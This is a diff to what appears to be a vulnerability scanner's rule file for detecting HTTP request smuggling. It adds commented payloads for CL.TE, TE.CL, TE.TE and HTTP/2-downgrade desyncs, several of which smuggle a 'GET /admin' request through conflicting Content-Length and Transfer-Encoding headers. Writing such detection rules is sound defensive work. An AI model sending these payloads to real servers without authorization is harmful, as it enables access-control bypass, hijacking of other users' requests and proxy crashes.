@@ -1,9 +1,26 @@
 id: http-smuggling
 name: HTTP request smuggling
 context:
-  server: ["nginx", "Apache", "HAProxy"]
+  server: ["nginx", "Apache", "HAProxy", "Cloudflare", "AWS-ALB"]
+
+# Sprint 76 Phase 2 — HTTP request smuggling (CL.TE / TE.CL / TE.TE).
+# **Intrusive:** these probes can crash flaky proxies. The Cybrium
+# platform requires `requires_intrusive_attestation=true` +
+# `intrusive_attestation_signed_at` set on the ScanJob before the
+# rule will dispatch.
+#
+# Detection oracles for smuggling are timing-based or content-pollution.
+# We send the suspect frame, then a benign follow-up request; if the
+# follow-up sees a different boundary than expected (typically
+# evidenced by a >= 5s timing delay or an unexpected 400-level
+# response) the proxy desync is real.
 
 payloads:
+  # ── CL.TE desync ─────────────────────────────────────────────────────────
+  # Front-end honours Content-Length, back-end honours Transfer-Encoding.
+  # The trailing `0\r\n\r\n` terminates the chunked stream from the
+  # back-end's view, so the smuggled request after the boundary lands
+  # on the next victim's connection.
   - value: "0\r\n\r\nGET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n"
     detect: { status_change: true }
     id: smuggle-clte-01
@@ -14,11 +31,64 @@ payloads:
     extra_headers:
       Content-Length: "4"
       Transfer-Encoding: "chunked"
+    vuln_class: http_smuggling
 
-  - value: "GET / HTTP/1.1\r\nHost: localhost\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: x\r\n\r\n0\r\n\r\n"
-    detect: { time_based_ms: 5000 }
+  # ── TE.CL desync ─────────────────────────────────────────────────────────
+  # Front-end honours Transfer-Encoding, back-end honours Content-Length.
+  # The smuggled request is hidden inside the chunked body the front-end
+  # passes through.
+  - value: "8\r\nSMUGGLED\r\n0\r\n\r\n"
+    detect: { status_change: true, time_based_ms: 5000 }
     id: smuggle-tecl-01
     title: "HTTP smuggling — TE.CL desync"
     severity: critical
     cwe: CWE-444
     inject_as: raw_body
+    extra_headers:
+      Content-Length: "4"
+      Transfer-Encoding: "chunked"
+    vuln_class: http_smuggling
+
+  # ── TE.TE — duplicate Transfer-Encoding header confusion ────────────────
+  # Both front-end and back-end honour TE, but obfuscation tricks one
+  # of them into ignoring the chunked encoding. Common via duplicate
+  # `Transfer-Encoding` headers or whitespace-prefixed values.
+  - value: "GET / HTTP/1.1\r\nHost: localhost\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: x\r\n\r\n0\r\n\r\n"
+    detect: { time_based_ms: 5000 }
+    id: smuggle-tete-01
+    title: "HTTP smuggling — TE.TE duplicate header confusion"
+    severity: critical
+    cwe: CWE-444
+    inject_as: raw_body
+    vuln_class: http_smuggling
+
+  # ── TE.TE — whitespace-prefixed Transfer-Encoding ───────────────────────
+  - value: "0\r\n\r\nGET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n"
+    detect: { time_based_ms: 5000 }
+    id: smuggle-tete-ws-01
+    title: "HTTP smuggling — TE.TE whitespace-prefix bypass"
+    severity: high
+    cwe: CWE-444
+    inject_as: raw_body
+    extra_headers:
+      Content-Length: "4"
+      "Transfer-Encoding ": "chunked"   # trailing space — some parsers strip it, some don't
+    vuln_class: http_smuggling
+
+  # ── HTTP/2 → HTTP/1.1 downgrade smuggling ───────────────────────────────
+  # When the front-end speaks HTTP/2 to the client and HTTP/1.1 to the
+  # back-end, malformed pseudo-headers can re-encode as smuggling on
+  # the back-end leg. We probe by sending an HTTP/2 request with a
+  # Transfer-Encoding header (forbidden in /2 spec but sometimes
+  # forwarded by buggy proxies).
+  - value: "0\r\n\r\nGET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n"
+    detect: { time_based_ms: 5000 }
+    id: smuggle-h2-downgrade-01
+    title: "HTTP smuggling — HTTP/2→HTTP/1.1 downgrade"
+    severity: high
+    cwe: CWE-444
+    inject_as: raw_body
+    extra_headers:
+      Transfer-Encoding: "chunked"
+      Content-Length: "4"
+    vuln_class: http_smuggling
